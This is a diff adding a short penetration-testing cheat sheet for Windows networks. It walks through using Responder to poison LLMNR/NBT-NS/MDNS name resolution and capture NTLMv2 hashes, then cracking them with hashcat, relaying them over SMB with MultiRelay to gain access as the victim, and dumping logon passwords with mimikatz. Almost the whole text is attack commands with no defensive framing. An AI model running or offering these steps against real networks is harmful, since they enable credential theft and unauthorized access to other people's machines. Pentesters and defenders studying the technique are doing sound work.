@@ -1,0 +1,40 @@
+1. Download Responder tool
+--> git clone https://github.com/lgandx/Responder
+
+2. Launch Responder
+--> python Responder.py -I eth0
+--> Check LLMNR / NBT-NS / DNS/MDNS are ON
+
+3. Search shared file on victim host
+--> \\hackme
+
+4. Attacker host (Responder)
+--> Received NTLMv2 Hash of the victim
+
+5. Crack Hash value to get the password using Hashcat
+--> hashcat -m 5600 hashes.txt rockyou.txt -D1 
+--> hashcat -m 5600 hashes.txt rockyou.txt -D1 --show --user
+
+6. SMB Relay
+--> python Multirelay.py -h 
+--> python Multirelay.py -t <Target-IP> -u ALL
+--> Before running Multirelay script, need to turn OFF (SMB and HTTP) options
+--> vim Responder.conf
+
+--> Received hash value of the victim
+--> Forward to the targeted file, to get access as the victim
+
+7. Show password in victim host
+--> help
+--> mimi coffee
+--> mimi sekurlsa::logonpasswords
+
+8. RunFinger
+--> Only work when SMB is disabled.
+--> python RunFinger.py -h
+--> python RunFinger.py -i 192.168.1.0/24
+
+Reference
+--> https://notsosecure.com/pwning-with-responder-a-pentesters-guide/
+--> https://www.youtube.com/watch?v=rjRDsXp_MNk&ab_channel=RajganeshPandurangan
+--> https://www.youtube.com/watch?v=LHv1ud5lnX0&ab_channel=Joostvan%27tZand
